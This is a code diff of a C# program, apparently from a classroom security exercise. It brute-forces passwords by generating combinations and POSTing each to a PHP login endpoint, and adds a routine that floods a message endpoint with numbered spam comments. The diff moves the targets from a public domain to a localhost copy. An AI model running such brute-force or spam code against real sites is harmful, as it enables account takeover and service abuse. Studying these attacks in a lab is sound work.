@@ -1,11 +1,7 @@
-﻿
-
-
-
-
-
+﻿using System.Threading;
 using System.Net;
 using System.Text;
+
 
 namespace BruteForce
 {
@@ -13,24 +9,25 @@ namespace BruteForce
     {
         public static string InvalidToken = "4439f14a03c1454a886a3b4101197e";
 
-        public static string Abc = "ABCDEFGHIKLMNOPQSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-
+        //public static string Abc = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+        public static string Abc = "Asdfg123";
         public delegate void Passwordhadler(string password);
 
         public static DateTime Start;
 
-        public void Main(string[] args)
+        static void Main(string[] args)
         {
             Start = DateTime.Now;
 
             CreatePassword(8, CheckPassword);
         }
-
+        //static int i = 0;
         public static void SingIn(string password)
         {
             try
             {
-                string url = "htpp://security.permaviat.ru/ajax/login_user.php";
+                //i++;
+                string url = "http://localhost/pr14mdk0903/security.permaviat.ru/ajax/regin_user.php";
                 HttpWebRequest Request = (HttpWebRequest)WebRequest.Create(url);
                 Request.Method = "POST";
                 Request.ContentType = "application/x-www-form-urlencoded";
@@ -56,7 +53,39 @@ namespace BruteForce
                 SingIn(exp.Message);
             }
         }
-    public static void CheckPassword(string password)
+        static int i = 0;
+
+        public static void SendComment()
+        {
+            try
+            {
+                i++;
+                string url = "http://localhost/pr14mdk0903/security.permaviat.ru/ajax/message.php";
+                HttpWebRequest Request = (HttpWebRequest)WebRequest.Create(url);
+                Request.Method = "POST";
+                Request.ContentType = "application/x-www-form-urlencoded";
+
+                
+                string PostData = $"IdUser=1&IdPost=1&Message=Спам комментарий {i}";
+                byte[] Data = Encoding.UTF8.GetBytes(PostData);
+                Request.ContentLength = Data.Length;
+
+                using (var stream = Request.GetRequestStream())
+                {
+                    stream.Write(Data, 0, Data.Length);
+                }
+
+                HttpWebResponse Response = (HttpWebResponse)Request.GetResponse();
+                string ResponseFromServer = new StreamReader(Response.GetResponseStream()).ReadToEnd();
+
+                Console.WriteLine($"Отправлено {i}: {ResponseFromServer}");
+            }
+            catch (Exception exp)
+            {
+                Console.WriteLine($"Ошибка: {exp.Message}");
+            }
+        }
+        public static void CheckPassword(string password)
         {
             Thread thread = new Thread(()=>SingIn(password));
             thread.Start();
@@ -71,7 +100,7 @@ namespace BruteForce
             for (int i = 0; i < totalCombinations; i++)
             {
                 StringBuilder password = new StringBuilder(numberChar);
-                for(int j = 0;j< numberChar; i++)
+                for(int j = 0;j< numberChar; j++)
                 {
                     password.Append(chars[indices[j]]);
                 }
